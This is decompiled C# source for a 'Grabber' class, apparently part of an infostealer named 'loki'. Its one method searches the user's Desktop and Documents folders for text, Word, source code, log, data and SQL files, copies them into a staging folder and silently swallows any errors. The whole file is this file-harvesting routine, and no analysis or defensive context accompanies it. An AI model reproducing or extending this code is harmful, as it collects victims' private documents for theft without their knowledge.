using System;
using System.IO;

namespace loki.loki.Utilies
{
	// Token: 0x02000026 RID: 38
	internal class Grabber
	{
		// Token: 0x06000161 RID: 353 RVA: 0x00008B88 File Offset: 0x00006D88
		public static void Grab_desktop(string dir)
		{
			try
			{
				foreach (FileInfo fileInfo in new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Desktop)).GetFiles())
				{
					if (!(fileInfo.Extension != ".txt") || !(fileInfo.Extension != ".doc") || !(fileInfo.Extension != ".cs") || !(fileInfo.Extension != ".cpp") || !(fileInfo.Extension != ".dat") || !(fileInfo.Extension != ".docx") || !(fileInfo.Extension != ".log") || !(fileInfo.Extension != ".sql"))
					{
						Directory.CreateDirectory(dir + "\\Files\\");
						fileInfo.CopyTo(dir + "\\Files\\" + fileInfo.Name);
					}
				}
				foreach (FileInfo fileInfo2 in new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Personal)).GetFiles())
				{
					if (!(fileInfo2.Extension != ".txt") || !(fileInfo2.Extension != ".doc") || !(fileInfo2.Extension != ".cs") || !(fileInfo2.Extension != ".cpp") || !(fileInfo2.Extension != ".dat") || !(fileInfo2.Extension != ".docx") || !(fileInfo2.Extension != ".log") || !(fileInfo2.Extension != ".sql"))
					{
						if (!Directory.Exists(dir + "\\files"))
						{
							Directory.CreateDirectory(dir + "\\Files\\");
						}
						fileInfo2.CopyTo(dir + "\\Files\\" + fileInfo2.Name);
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}
}
